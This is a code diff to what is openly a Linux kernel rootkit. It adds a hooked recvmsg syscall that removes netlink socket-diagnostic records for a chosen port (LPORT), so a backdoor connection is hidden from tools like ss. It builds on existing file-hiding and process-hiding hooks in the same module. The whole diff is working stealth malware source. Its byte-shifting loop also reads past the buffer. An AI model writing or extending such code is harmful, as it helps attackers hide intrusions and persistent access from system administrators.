@@ -2,6 +2,8 @@
 #include <linux/dirent.h>
 #include <linux/fdtable.h>
 #include <linux/proc_ns.h>
+#include <net/tcp.h>
+#include <linux/inet_diag.h>
 
 extern u8 module_hidden;
 
@@ -61,6 +63,66 @@ asmlinkage long rk_getdents64(const struct pt_regs *pt_regs)
 
     kfree(kdirent);
     return ret;
+}
+
+/* Socket hiding */
+
+int hidden_socket(struct nlmsghdr *hdr)
+{
+    struct inet_diag_msg *r = NLMSG_DATA(hdr);
+
+    return ntohs(r->id.idiag_dport) == LPORT;
+}
+
+asmlinkage long rk_recvmsg(const struct pt_regs *pt_regs)
+{
+    struct user_msghdr __user *msg = (struct user_msghdr __user *)pt_regs->si;
+
+	long ret;
+	struct nlmsghdr *nlh;
+	long count;
+	int found;
+	char *stream;
+	int offset;
+	int i;
+
+	ret = orig_recvmsg(pt_regs);
+
+    if (is_hidden_proc(current->pid)) return ret;
+
+	if (ret < 0)
+		return ret;
+
+	nlh = (struct nlmsghdr *)(msg->msg_iov->iov_base);
+
+    if (nlh == NULL) return ret;
+
+    count = ret;
+
+	found = 1;
+
+	while (NLMSG_OK(nlh, count)) {
+		if (found == 0)
+			nlh = NLMSG_NEXT(nlh, count);
+
+		if (!hidden_socket(nlh)) {
+			found = 0;
+			continue;
+		}
+        
+		found = 1;
+
+		stream = (char *) nlh;
+
+		offset = NLMSG_ALIGN((nlh)->nlmsg_len);
+
+		for (i=0 ; i<count ; i++)
+			stream[i] = stream[i + offset];
+
+		ret -= offset;
+	}
+
+	return ret;
 }
 
 /* Process management */
